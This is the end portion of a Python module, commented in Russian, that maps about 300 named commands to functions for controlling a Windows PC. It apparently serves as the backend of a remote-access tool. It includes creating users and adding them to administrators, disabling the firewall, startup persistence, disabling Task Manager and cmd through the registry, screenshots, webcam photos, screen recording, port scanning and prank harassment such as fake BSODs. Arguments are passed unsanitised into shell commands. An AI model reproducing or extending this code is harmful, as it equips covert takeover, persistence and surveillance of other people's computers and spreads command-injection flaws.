    except:
        return "❌ Ошибка"

def add_user(name, password):
    os.system(f"net user {name} {password} /add")
    return f"✅ Пользователь {name} добавлен"

def delete_user(name):
    os.system(f"net user {name} /delete")
    return f"✅ Пользователь {name} удалён"

def user_info(name):
    try:
        result = subprocess.run(f"net user {name}", shell=True, capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

def change_password(name, password):
    os.system(f"net user {name} {password}")
    return f"✅ Пароль для {name} изменён"

def add_to_admin(name):
    os.system(f"net localgroup administrators {name} /add")
    return f"✅ {name} добавлен в администраторы"

def remove_from_admin(name):
    os.system(f"net localgroup administrators {name} /delete")
    return f"✅ {name} удалён из администраторов"

def list_admins():
    try:
        result = subprocess.run("net localgroup administrators", shell=True, capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

def disable_user(name):
    os.system(f"net user {name} /active:no")
    return f"🔒 {name} отключён"

def enable_user(name):
    os.system(f"net user {name} /active:yes")
    return f"🔓 {name} включён"

# ============================================================
# 14. СЕТЬ (10 функций)
# ============================================================

def ping_host(host):
    try:
        result = subprocess.run(f"ping {host} -n 4", shell=True, capture_output=True, text=True)
        return result.stdout[:2000]
    except:
        return "❌ Ошибка"

def tracert_host(host):
    try:
        result = subprocess.run(f"tracert {host}", shell=True, capture_output=True, text=True)
        return result.stdout[:2000]
    except:
        return "❌ Ошибка"

def nslookup_host(host):
    try:
        result = subprocess.run(f"nslookup {host}", shell=True, capture_output=True, text=True)
        return result.stdout[:2000]
    except:
        return "❌ Ошибка"

def netstat_all():
    try:
        result = subprocess.run("netstat -an", shell=True, capture_output=True, text=True)
        return result.stdout[:3000]
    except:
        return "❌ Ошибка"

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org", timeout=10)
        return f"🌐 Публичный IP: {response.text}"
    except:
        return "❌ Ошибка"

def get_local_ip():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return f"🌐 Локальный IP: {ip}"
    except:
        return "❌ Ошибка"

def port_scan(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        sock.close()
        if result == 0:
            return f"✅ Порт {port} открыт"
        return f"❌ Порт {port} закрыт"
    except:
        return "❌ Ошибка"

def open_ports():
    try:
        result = subprocess.run("netstat -an | findstr LISTENING", shell=True, capture_output=True, text=True)
        return result.stdout[:2000]
    except:
        return "❌ Ошибка"

def dns_servers():
    try:
        result = subprocess.run("ipconfig /all | findstr DNS", shell=True, capture_output=True, text=True)
        return result.stdout[:2000]
    except:
        return "❌ Ошибка"

def reset_network():
    os.system("netsh winsock reset")
    os.system("netsh int ip reset")
    return "🔄 Сеть сброшена (перезагрузите ПК)"

# ============================================================
# 15. ПРОЧЕЕ (20 функций)
# ============================================================

def get_time():
    return f"🕐 Время: {time.strftime('%H:%M:%S')}"

def get_date():
    return f"📅 Дата: {time.strftime('%d.%m.%Y')}"

def get_datetime():
    return f"📅 {time.strftime('%d.%m.%Y %H:%M:%S')}"

def beep():
    import winsound
    winsound.Beep(800, 500)
    return "🔊 Бип"

def beep_long():
    import winsound
    for _ in range(5):
        winsound.Beep(800, 200)
        time.sleep(0.1)
    return "🔊 Длинный бип"

def play_sound():
    import winsound
    winsound.PlaySound("SystemAsterisk", winsound.SND_ALIAS)
    return "🔊 Звук воспроизведён"

def open_calculator():
    subprocess.Popen("calc.exe", shell=True)
    return "🧮 Калькулятор открыт"

def open_browser():
    webbrowser.open("https://google.com")
    return "🌐 Браузер открыт"

def open_task_manager():
    subprocess.Popen("taskmgr.exe", shell=True)
    return "📊 Диспетчер задач открыт"

def open_device_manager():
    subprocess.Popen("devmgmt.msc", shell=True)
    return "🖥️ Диспетчер устройств открыт"

def open_disk_management():
    subprocess.Popen("diskmgmt.msc", shell=True)
    return "💾 Управление дисками открыто"

def open_services():
    subprocess.Popen("services.msc", shell=True)
    return "⚙️ Службы открыты"

def open_event_viewer():
    subprocess.Popen("eventvwr.msc", shell=True)
    return "📋 Просмотр событий открыт"

def open_resource_monitor():
    subprocess.Popen("resmon.exe", shell=True)
    return "📊 Монитор ресурсов открыт"

def open_performance_monitor():
    subprocess.Popen("perfmon.msc", shell=True)
    return "📊 Монитор производительности открыт"

def open_system_properties():
    os.system("sysdm.cpl")
    return "🖥️ Свойства системы открыты"

def open_display_settings():
    os.system("desk.cpl")
    return "🖥️ Настройки экрана открыты"

def open_sound_settings():
    os.system("mmsys.cpl")
    return "🔊 Настройки звука открыты"

def open_network_settings():
    os.system("ncpa.cpl")
    return "🌐 Сетевые подключения открыты"

def open_power_settings():
    os.system("powercfg.cpl")
    return "🔋 Настройки питания открыты"

def open_region_settings():
    os.system("intl.cpl")
    return "🌍 Язык и регион открыты"

def open_date_time():
    os.system("timedate.cpl")
    return "🕐 Дата и время открыты"

def open_mouse_settings():
    os.system("main.cpl")
    return "🖱️ Настройки мыши открыты"

def open_keyboard_settings():
    os.system("control keyboard")
    return "⌨️ Настройки клавиатуры открыты"

def open_fonts():
    os.system("control fonts")
    return "🔤 Шрифты открыты"

def open_programs_features():
    os.system("appwiz.cpl")
    return "📦 Программы и компоненты открыты"

def open_user_accounts():
    os.system("netplwiz")
    return "👤 Учётные записи открыты"

def open_credential_manager():
    os.system("control /name Microsoft.CredentialManager")
    return "🔑 Диспетчер учётных данных открыт"

def open_system_restore():
    os.system("rstrui.exe")
    return "🔄 Восстановление системы открыто"

def open_disk_cleanup():
    subprocess.Popen("cleanmgr.exe", shell=True)
    return "🧹 Очистка диска открыта"

def open_defrag():
    subprocess.Popen("dfrgui.exe", shell=True)
    return "🔄 Дефрагментация открыта"

def open_memory_diagnostic():
    subprocess.Popen("mdsched.exe", shell=True)
    return "🧠 Проверка памяти открыта"

def open_windows_update():
    os.system("start ms-settings:windowsupdate")
    return "🔄 Центр обновления открыт"

def open_windows_security():
    os.system("start windowsdefender:")
    return "🛡️ Безопасность Windows открыта"

def open_firewall_settings():
    os.system("firewall.cpl")
    return "🛡️ Брандмауэр открыт"

def open_proxy_settings():
    os.system("start ms-settings:network-proxy")
    return "🌐 Настройки прокси открыты"

def open_vpn_settings():
    os.system("start ms-settings:network-vpn")
    return "🔒 Настройки VPN открыты"

def open_bluetooth_settings():
    os.system("start ms-settings:bluetooth")
    return "📶 Настройки Bluetooth открыты"

def open_printer_settings():
    os.system("control printers")
    return "🖨️ Принтеры открыты"

def open_scanner_settings():
    os.system("wiaacmgr")
    return "📷 Сканер открыт"

def open_camera_settings():
    os.system("start microsoft.windows.camera:")
    return "📷 Камера открыта"

def open_microphone_settings():
    os.system("start ms-settings:privacy-microphone")
    return "🎤 Микрофон открыт"

def open_location_settings():
    os.system("start ms-settings:privacy-location")
    return "📍 Геолокация открыта"

def open_notifications_settings():
    os.system("start ms-settings:notifications")
    return "🔔 Уведомления открыты"

def open_battery_settings():
    os.system("start ms-settings:batterysaver")
    return "🔋 Батарея открыта"

def open_storage_settings():
    os.system("start ms-settings:storagesense")
    return "💾 Память открыта"

def open_apps_settings():
    os.system("start ms-settings:appsfeatures")
    return "📦 Приложения открыты"

def open_accounts_settings():
    os.system("start ms-settings:yourinfo")
    return "👤 Учётная запись открыта"

def open_time_settings():
    os.system("start ms-settings:dateandtime")
    return "🕐 Дата и время открыты"

def open_language_settings():
    os.system("start ms-settings:regionlanguage")
    return "🌍 Язык открыт"

def open_ease_of_access():
    os.system("start ms-settings:easeofaccess")
    return "♿ Специальные возможности открыты"

def open_privacy_settings():
    os.system("start ms-settings:privacy")
    return "🔒 Конфиденциальность открыта"

def open_update_settings():
    os.system("start ms-settings:windowsupdate")
    return "🔄 Обновление открыто"

def open_developer_settings():
    os.system("start ms-settings:developers")
    return "🛠️ Для разработчиков открыто"

def open_about_settings():
    os.system("start ms-settings:about")
    return "ℹ️ О системе открыто"

# ============================================================
# СЛОВАРЬ ВСЕХ КОМАНД (для вызова по имени)
# ============================================================

COMMANDS = {
    # Питание
    "shutdown": shutdown,
    "restart": restart,
    "lock": lock_pc,
    "logout": logout,
    "sleep": sleep_pc,
    "hibernate": hibernate,
    "cancel_shutdown": cancel_shutdown,
    "shutdown_timer": shutdown_timer,
    "restart_timer": restart_timer,
    "lock_keyboard": lock_keyboard,
    
    # Экран
    "screenshot": screenshot,
    "screenshot_save": screenshot_save,
    "monitor_off": monitor_off,
    "monitor_on": monitor_on,
    "monitor_standby": monitor_standby,
    "rotate_90": rotate_screen_90,
    "rotate_180": rotate_screen_180,
    "rotate_270": rotate_screen_270,
    "rotate_0": rotate_screen_0,
    "cursor_0_0": cursor_0_0,
    "screen_resolution": screen_resolution,
    "screen_info": screen_info,
    "record_screen": record_screen,
    "take_photo": take_photo,
    "brightness_up": brightness_up,
    "brightness_down": brightness_down,
    
    # Программы
    "cmd": open_cmd,
    "powershell": open_powershell,
    "notepad": open_notepad,
    "calc": open_calc,
    "explorer": open_explorer,
    "taskmgr": open_taskmgr,
    "paint": open_paint,
    "snippingtool": open_snippingtool,
    "control": open_control,
    "devmgmt": open_devmgmt,
    "msconfig": open_msconfig,
    "regedit": open_regedit,
    "charmap": open_charmap,
    "magnify": open_magnify,
    "osk": open_osk,
    "winver": open_winver,
    "dxdiag": open_dxdiag,
    "diskmgmt": open_diskmgmt,
    "eventvwr": open_eventvwr,
    "services": open_services,
    "perfmon": open_perfmon,
    "resmon": open_resmon,
    "cleanmgr": open_cleanmgr,
    "dfrag": open_dfrag,
    "mdsched": open_mdsched,
    "winupdate": open_winupdate,
    "settings": open_settings,
    "camera": open_camera,
    "store": open_store,
    "snip": open_snip,
    "explorer_path": open_explorer_path,
    
    # Сайты
    "open_url": open_url,
    "youtube": open_youtube,
    "google": open_google,
    "vk": open_vk,
    "github": open_github,
    "twitch": open_twitch,
    "discord": open_discord,
    "telegram": open_telegram,
    "reddit": open_reddit,
    "twitter": open_twitter,
    "instagram": open_instagram,
    "tiktok": open_tiktok,
    "chatgpt": open_chatgpt,
    "wikipedia": open_wikipedia,
    "yandex": open_yandex,
    "mail": open_mail,
    "ok": open_ok,
    "steam": open_steam,
    "epic": open_epic,
    "spotify": open_spotify,
    "netflix": open_netflix,
    "rickroll": open_rickroll,
    "rickroll_5": open_rickroll_5,
    "rickroll_10": open_rickroll_10,
    "rickroll_20": open_rickroll_20,
    
    # Приколы
    "kill_explorer": kill_explorer,
    "restore_explorer": restore_explorer,
    "max_volume": max_volume,
    "mute_volume": mute_volume,
    "unmute_volume": unmute_volume,
    "volume_up": volume_up,
    "volume_down": volume_down,
    "firefox_10": open_firefox_10,
    "chrome_10": open_chrome_10,
    "notepad_10": open_notepad_10,
    "calc_10": open_calc_10,
    "fake_bsod": fake_bsod,
    "fake_error": fake_error,
    "fake_warning": fake_warning,
    "fake_info": fake_info,
    "flip_screen": flip_screen,
    "hide_taskbar": hide_taskbar,
    "show_taskbar": show_taskbar,
    "disable_taskbar": disable_taskbar,
    "enable_taskbar": enable_taskbar,
    "notepad_100": open_100_notepad,
    
    # Система
    "status": get_status,
    "cpu": get_cpu,
    "ram": get_ram,
    "disk": get_disk,
    "battery": get_battery,
    "uptime": get_uptime,
    "os": get_os,
    "hostname": get_hostname,
    "username": get_username,
    "ip": get_ip,
    "mac": get_mac,
    "processes": list_processes,
    "kill_process": kill_process,
    "start_process": start_process,
    "systeminfo": systeminfo,
    "ipconfig": ipconfig,
    "ping": ping_google,
    "flush_dns": flush_dns,
    "netstat": netstat,
    "arp": arp_table,
    "route": route_print,
    "wifi": wifi_networks,
    "add_startup": add_to_startup,
    "remove_startup": remove_from_startup,
    "clean_temp": clean_temp,
    "clean_wintemp": clean_wintemp,
    "empty_recycle": empty_recycle,
    "open_firewall": open_firewall,
    "disable_firewall": disable_firewall,
    "enable_firewall": enable_firewall,
    "installed_programs": get_installed_programs,
    
    # Файлы
    "list_files": list_files,
    "create_file": create_file,
    "delete_file": delete_file,
    "copy_file": copy_file,
    "move_file": move_file,
    "rename_file": rename_file,
    "create_dir": create_dir,
    "delete_dir": delete_dir,
    "download_file": download_file,
    "file_info": file_info,
    "disk_usage": disk_usage,
    "open_file": open_file,
    "open_folder": open_folder,
    "search_files": search_files,
    "read_file": read_file,
    "write_file": write_file,
    "append_file": append_file,
    "zip_folder": zip_folder,
    "unzip_file": unzip_file,
    "hash_file": hash_file,
    "file_exists": file_exists,
    "dir_exists": dir_exists,
    "current_dir": current_dir,
    "change_dir": change_dir,
    "get_file_size": get_file_size,
    
    # Мышь и клавиатура
    "mouse_move": mouse_move,
    "mouse_click": mouse_click,
    "mouse_right_click": mouse_right_click,
    "mouse_double_click": mouse_double_click,
    "mouse_scroll": mouse_scroll,
    "key_press": key_press,
    "type_text": type_text,
    "hotkey": hotkey,
    "press_enter": press_enter,
    "press_escape": press_escape,
    "press_tab": press_tab,
    "press_space": press_space,
    "press_backspace": press_backspace,
    "press_delete": press_delete,
    "press_win": press_win,
    "press_alt_f4": press_alt_f4,
    "press_ctrl_c": press_ctrl_c,
    "press_ctrl_v": press_ctrl_v,
    "press_ctrl_a": press_ctrl_a,
    "press_ctrl_s": press_ctrl_s,
    
    # Обои
    "set_wallpaper": set_wallpaper,
    "set_wallpaper_url": set_wallpaper_url,
    "set_wallpaper_random": set_wallpaper_random,
    "reset_wallpaper": reset_wallpaper,
    "get_wallpaper": get_wallpaper,
    
    # Уведомления
    "show_message": show_message,
    "show_warning": show_warning,
    "show_error": show_error,
    "show_question": show_question,
    "show_info": show_info,
    
    # Реестр
    "reg_read": reg_read,
    "reg_write": reg_write,
    "reg_delete": reg_delete,
    "reg_list": reg_list,
    "reg_create_key": reg_create_key,
    "reg_delete_key": reg_delete_key,
    "reg_disable_taskmgr": reg_disable_taskmgr,
    "reg_enable_taskmgr": reg_enable_taskmgr,
    "reg_disable_cmd": reg_disable_cmd,
    "reg_enable_cmd": reg_enable_cmd,
    
    # Службы
    "list_services": list_services,
    "start_service": start_service,
    "stop_service": stop_service,
    "restart_service": restart_service,
    "service_status": service_status,
    "disable_service": disable_service,
    "enable_service": enable_service,
    "list_started_services": list_started_services,
    "open_services_msc": open_services_msc,
    "service_info": service_info,
    
    # Пользователи
    "list_users": list_users,
    "add_user": add_user,
    "delete_user": delete_user,
    "user_info": user_info,
    "change_password": change_password,
    "add_to_admin": add_to_admin,
    "remove_from_admin": remove_from_admin,
    "list_admins": list_admins,
    "disable_user": disable_user,
    "enable_user": enable_user,
    
    # Сеть
    "ping_host": ping_host,
    "tracert_host": tracert_host,
    "nslookup_host": nslookup_host,
    "netstat_all": netstat_all,
    "public_ip": get_public_ip,
    "local_ip": get_local_ip,
    "port_scan": port_scan,
    "open_ports": open_ports,
    "dns_servers": dns_servers,
    "reset_network": reset_network,
    
    # Прочее
    "time": get_time,
    "date": get_date,
    "datetime": get_datetime,
    "beep": beep,
    "beep_long": beep_long,
    "play_sound": play_sound,
    "calculator": open_calculator,
    "browser": open_browser,
    "task_manager": open_task_manager,
    "device_manager": open_device_manager,
    "disk_management": open_disk_management,
    "services_msc": open_services,
    "event_viewer": open_event_viewer,
    "resource_monitor": open_resource_monitor,
    "performance_monitor": open_performance_monitor,
    "system_properties": open_system_properties,
    "display_settings": open_display_settings,
    "sound_settings": open_sound_settings,
    "network_settings": open_network_settings,
    "power_settings": open_power_settings,
    "region_settings": open_region_settings,
    "date_time": open_date_time,
    "mouse_settings": open_mouse_settings,
    "keyboard_settings": open_keyboard_settings,
    "fonts": open_fonts,
    "programs_features": open_programs_features,
    "user_accounts": open_user_accounts,
    "credential_manager": open_credential_manager,
    "system_restore": open_system_restore,
    "disk_cleanup": open_disk_cleanup,
    "defrag": open_defrag,
    "memory_diagnostic": open_memory_diagnostic,
    "windows_update": open_windows_update,
    "windows_security": open_windows_security,
    "firewall_settings": open_firewall_settings,
    "proxy_settings": open_proxy_settings,
    "vpn_settings": open_vpn_settings,
    "bluetooth_settings": open_bluetooth_settings,
    "printer_settings": open_printer_settings,
    "scanner_settings": open_scanner_settings,
    "camera_settings": open_camera_settings,
    "microphone_settings": open_microphone_settings,
    "location_settings": open_location_settings,
    "notifications_settings": open_notifications_settings,
    "battery_settings": open_battery_settings,
    "storage_settings": open_storage_settings,
    "apps_settings": open_apps_settings,
    "accounts_settings": open_accounts_settings,
    "time_settings": open_time_settings,
    "language_settings": open_language_settings,
    "ease_of_access": open_ease_of_access,
    "privacy_settings": open_privacy_settings,
    "update_settings": open_update_settings,
    "developer_settings": open_developer_settings,
    "about_settings": open_about_settings,
}

# ============================================================
# ФУНКЦИЯ ДЛЯ ВЫПОЛНЕНИЯ КОМАНДЫ ПО ИМЕНИ
# ============================================================

def execute(command_name, *args):
    """
    Выполняет команду по имени.
    Пример: execute("shutdown") — выключить ПК
    Пример: execute("open_url", "google.com") — открыть сайт
    """
    if command_name in COMMANDS:
        try:
            return COMMANDS[command_name](*args)
        except Exception as e:
            return f"❌ Ошибка выполнения {command_name}: {e}"
    return f"❌ Команда {command_name} не найдена"

def get_all_commands():
    """Возвращает список всех команд"""
    return list(COMMANDS.keys())

def get_commands_count():
    """Возвращает количество команд"""
    return len(COMMANDS)

if __name__ == "__main__":
    print(f"✅ Загружено команд: {get_commands_count()}")
    print("📋 Список команд:")
    for cmd in get_all_commands():
        print(f"  - {cmd}")